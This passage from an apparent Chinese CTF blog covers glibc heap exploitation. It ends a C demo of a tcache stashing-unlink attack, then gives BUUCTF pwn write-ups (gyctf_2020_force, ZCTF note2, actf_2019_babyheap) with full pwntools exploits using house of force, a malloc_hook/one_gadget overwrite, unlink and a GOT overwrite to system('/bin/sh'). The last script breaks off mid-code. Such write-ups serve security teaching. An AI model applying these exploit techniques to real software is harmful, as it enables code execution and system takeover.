will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>参考《buu刷题记之PWN系列》</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>​        总的来说，加入<code>tache</code>让堆题的可玩性增加了不少，但利用的手法都不是很复杂，只能说开发者在安全性和效率之间，更偏向于效率，才导致这么多问题出现，以前对<code>tache</code>的题目很恐慌。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题记之PWN系列</title>
      <link href="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/"/>
      <url>/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h3><h4 id="0x00-基本信息"><a href="#0x00-基本信息" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/1.png" class=""><p>保护全开，GOT也写不了，看这个名字就感觉是house of force….</p><h4 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/2.png" class=""><p>正好印证了之前的猜测，满足house of force的条件：</p><p>可覆盖Top chunk为-1</p><p>能够分配任意大小的堆块以及分配的次数</p><p>先试一下覆盖Top chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heap_base = add(<span class="number">10</span>,payload)</span><br></pre></td></tr></table></figure><p>没啥毛病！不记得回去看看house of force</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/3.png" class=""><p>接下来就是想着任意地址堆块分配到哪里去了，前面看到保护全开，其实我第一想法是覆盖GOT表的，但是RELOC保护全开了，没办法了！只能覆盖malloc_hook，写one_gadget了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/4.png" class="" width="4"><h4 id="0x02-解题思路"><a href="#0x02-解题思路" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><p>1.泄露libc，heap基址</p><p>2.修改Top chunk的size为-1</p><p>3.劫持__malloc_hook修改one_gadget，这里需要realloc改变栈环境</p><h4 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;, 26108)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;addr &#x27;</span>)</span><br><span class="line">    heap = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content\n&#x27;</span>, content)</span><br><span class="line">    <span class="keyword">return</span> heap</span><br><span class="line"></span><br><span class="line">libc_base = new(<span class="number">0x200000</span>, <span class="string">&#x27;aaa&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base : &#x27;</span> + <span class="built_in">hex</span>(libc_base)</span><br><span class="line">heap_base = new(<span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_base : &#x27;</span> + <span class="built_in">hex</span>(heap_base)</span><br><span class="line">top = heap_base + <span class="number">0x10</span></span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class="line">offset = malloc_hook - top</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;offset : &#x27;</span> + <span class="built_in">hex</span>(offset)</span><br><span class="line">realloc = libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf0274</span>, <span class="number">0xf1117</span>]</span><br><span class="line">one = onegadget[<span class="number">1</span>] + libc_base</span><br><span class="line">new(offset - <span class="number">0x33</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(one) + p64(realloc + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><h5 id="1-libc基址的获取"><a href="#1-libc基址的获取" class="headerlink" title="1.libc基址的获取"></a>1.libc基址的获取</h5><p>我们通过IDA看到，当成功分配一个堆块的时候，会将此堆块的地址打印出来，那么当堆块size过大的时候，它会通过mmap来分配堆块，此堆块的分配会紧挨着libc，就能利用输出的堆地址计算libc地址</p><h5 id="2-realloc平衡原理"><a href="#2-realloc平衡原理" class="headerlink" title="2.realloc平衡原理"></a>2.realloc平衡原理</h5><p>我们在劫持完__malloc_hook修改成one_gadget的时候，发现四个one_gadget都不能getshell，那么可以考虑通过realloc来平衡栈，实现one_gadget，下图我们可以看到除了第一个one_gadget的条件是rax的值为NULL，其他的都是栈上的某一个位置的值为NULL，所以用realloc来平衡栈就可以getshell了！！</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/12.png" class=""><p>我们知道啊，当进行malloc的时候呢，是先判断__malloc_hook的值是否为空，如果不为空就跳到这个值的地址上去，那么我们填上realloc的地址，就可以跳到realloc上去</p><p>realloc之所以能够调整栈帧，是因为进入realloc函数之后会push一系列的参数进去，接着和__malloc_hook一样，判断realloc_hook是否为空，不为空就跳转进去执行，需要注意的是要控制好psuh参数的个数，也就是加上一定的偏移</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/13.jpg" class=""><p>所以执行流程是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc —&gt; __malloc_hook —&gt; realloc —&gt; __realloc_hook —&gt; one_gadget --&gt;getshell</span><br></pre></td></tr></table></figure><p>实际的操作中还是去试偏移会快一点….</p><h3 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h3><h4 id="0x00-基本信息-1"><a href="#0x00-基本信息-1" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/5.png" class=""><p>可以写GOT表…</p><h4 id="0x01-IDA分析-1"><a href="#0x01-IDA分析-1" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/6.png" class=""><p>经典菜单题，一个函数一个函数看吧！</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/image-20210818154940988.png" class=""><p>分配note的数量限制在4个以内，大小限制为0x80以内，但是需要注意的是它没有限制堆块的大小不为0，接下来就是读入content</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/7.png" class=""><p>刚刚说到它没有限制堆块大小为0，那么当size也就是a2为0的时候，a2 - 1 = -1，与无符号变量i进行对比的时候，-1将转化成最大的无符号数，那么就可以实现溢出了</p><p>除此之外，程序还维护了一张堆块的信息表，一看到这第一反应肯定是劫持这个堆块表</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/8.png" class=""><h5 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/9.png" class=""><p>没啥毛病，在ptr中有记录此堆块的内容指针，就打印出来</p><h5 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/10.png" class=""><h5 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/11.png" class=""><p>free掉之后清零了，不存在uaf，我们的目的是劫持刚刚的堆块表，这里没有uaf，堆块大小也限制了，考虑用unlink</p><h4 id="0x02-解题思路-1"><a href="#0x02-解题思路-1" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><p>1.布置堆风水，为unlink做铺垫</p><p>2.unlink使得ptr[0] = ptr[0] - 0x18</p><p>3.修改堆指针为atoi@got，show它泄露libc地址</p><p>4.修改atoi@got为system@got</p><h4 id="0x03-完整EXP-1"><a href="#0x03-完整EXP-1" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;note2&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;25066&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 128)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the note content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,chioce,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(chioce))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your name:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your address:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line">fake_fd = ptr - <span class="number">0x18</span></span><br><span class="line">fake_bk = ptr - <span class="number">0x10</span></span><br><span class="line">fake_content0 = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xa1</span>)+p64(fake_fd)+p64(fake_bk)</span><br><span class="line">add(<span class="number">0x80</span>,fake_content0)</span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;atoi_addr : &#x27;</span> + <span class="built_in">hex</span>(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr : &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-总结-1"><a href="#0x04-总结-1" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><h5 id="1-unlink注意事项"><a href="#1-unlink注意事项" class="headerlink" title="1.unlink注意事项"></a>1.unlink注意事项</h5><p>刚开始对这个payload匪夷所思</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br></pre></td></tr></table></figure><p><strong>向后合并</strong>的源码如下</p><ul><li><p>我们发现它首先会判断<strong>prev_inuse</strong>是否为0，而在此题目中的堆块是fastbin范畴的堆块，所以当它被free的时候并不会把<strong>prev_inuse</strong>置为0，需要我们手动置零</p></li><li><p>将<strong>prev_size</strong>拿出来加上它本来的大小变成它unlink结束之后堆块的大小</p></li><li><p>根据当前的chunk的<strong>prev_size</strong>来获取到前一个堆块的指针（这里的向后合并其实是向低地址合并</p></li><li><p>开始unlink~</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line"></span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然复习到向后合并，那就…</p><p><strong>向前合并</strong>的源码</p><p>和向后合并相比，向前合并的源码就简单一些</p><ul><li>先会判断是不是和top chunk相邻，相邻就合并了</li><li>如果nextinuse是1就修改它的prev_inuse为0</li><li>unlink完事之后把size改为合并后的size</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="actf-2019-babyheap"><a href="#actf-2019-babyheap" class="headerlink" title="actf_2019_babyheap"></a>actf_2019_babyheap</h3><h4 id="0x00-基本信息-2"><a href="#0x00-基本信息-2" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/14.png" class=""><h4 id="0x01-IDA分析-2"><a href="#0x01-IDA分析-2" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><p>先看看free函数</p><h5 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/15.png" class=""><p>经典uaf</p><h5 id="create函数"><a href="#create函数" class="headerlink" title="create函数"></a>create函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/16.png" class=""><p>经典之不能再经典</p><h5 id="print函数"><a href="#print函数" class="headerlink" title="print函数"></a>print函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/16.jpg" class=""><p>留了一个后门函数，直接执行内容，在初始化的时候我们看到了system函数</p><h4 id="0x02-解题思路-2"><a href="#0x02-解题思路-2" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><h4 id="0x03-完整EXP-2"><a href="#0x03-完整EXP-2" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;ACTF_2019_babyheap&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26654</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ACTF_2019_babyheap&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,payload</span>):</span>                                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span 